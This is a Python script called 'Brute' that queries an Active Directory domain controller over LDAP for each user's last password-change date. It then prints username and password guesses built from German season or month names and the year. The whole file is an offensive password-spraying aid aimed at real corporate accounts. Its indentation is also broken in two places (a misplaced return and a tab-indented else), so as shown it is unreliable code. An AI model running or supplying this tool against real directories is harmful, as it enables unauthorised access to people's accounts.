#!/usr/bin/python3
import ldap, argparse, sys, datetime
from typing import List

# TODO: more languages, read from json file
months = {
    1: "Januar",
    2: "Februar",
    3: "März",
    4: "April",
    5: "Mai",
    6: "Juni",
    7: "Juli",
    8: "August",
    9: "September",
    10: "Oktober",
    11: "November",
    12: "Dezember"
}

seasons = ["Frühling", "Sommer", "Herbst", "Winter"]

class LdapUser:
    def __init__(self, dn, samAccountName, pwdLastSet):
        self.dn = dn
        self.samAccountName = samAccountName[0].decode('utf-8')
        self.pwdLastSet = int(pwdLastSet[0])

def ad_timestamp_to_unix(timestamp):
    if timestamp != 0:
        return datetime.datetime(1601, 1, 1) + datetime.timedelta(seconds=timestamp/10000000)
    return None

def get_users(con, user_dn, password, domain, ou) -> List[LdapUser]:
    results = []

    attributes = ['sAMAccountName', 'pwdLastSet']
    domain_cn = "".join([f"DC={x}," for x in domain.split('.')])[:-1]

    try:
        con.simple_bind_s(user_dn, password)
        res = con.search_s(f"{ou}{domain_cn}", ldap.SCOPE_SUBTREE, '(&(objectClass=User)(objectCategory=Person))', attributes)
        for dn, entry in res:
            results.append(LdapUser(dn, entry.get("sAMAccountName"), entry.get("pwdLastSet")))
    except Exception as error:
        print(error)

return results

def main():
    parser = argparse.ArgumentParser(
            prog = "Brute",
            description = "Generates a list of passwords according to users pwdLastSet-date"
    )

    # TODO: anonymous bind
    parser.add_argument("mode", help="season or month")
    parser.add_argument("mask", help="mask to generate the pw, e.g. WordYY, WordYYYY!, Word#YYYY, where Word will be replaced by season or month")
    parser.add_argument('-u', '--username', metavar="username@domain.local", type=str, required=True)
    parser.add_argument('-p', '--password', metavar="<Password>", type=str, required=True)
    parser.add_argument('--ssl', action="store_true", default=False)
    parser.add_argument('--dc-ip', metavar="<DC IP or FQDN>", type=str, required=True)
    parser.add_argument('--ou', metavar="OU=Users,OU=Berlin", default="", type=str, required=True)

    args = parser.parse_args()

    if args.mode not in ["season", "month"]:
        print("[!] Invalid mode")
        sys.exit(1)

    user_dn = args.username
    password = args.password
    domain = user_dn.split('@')[1]
    if args.ou != "":
        ou = args.ou if args.ou.endswith(',') else f"{args.ou},"
    else:
        ou = ""
    protocol = "ldaps" if args.ssl else "ldap"
    con = ldap.initialize(f'{protocol}://{args.dc_ip}')

    users = get_users(con, user_dn, password, domain, ou)

    for user in users:
        ts = ad_timestamp_to_unix(user.pwdLastSet)

        if ts == None:
            continue

        month = int(ts.strftime('%m'))
        year = str(ts.strftime('%Y'))

        if args.mode == "season":
            if month <= 3:
                password = args.mask.replace("Word", seasons[0])
            if month > 3 and month <= 6:
                password = args.mask.replace("Word", seasons[1])
            if month > 6 and month <= 9:
                password = args.mask.replace("Word", seasons[2])
            if month > 9:
                password = args.mask.replace("Word", seasons[3])
	else: # mode == month
            password = args.mask.replace("Word", months[month])

        password = password.replace("YYYY", year)
        password = password.replace("YY", year[-2:])

        print(f"{user.samAccountName}:{password}")

if __name__ == "__main__":
    main()
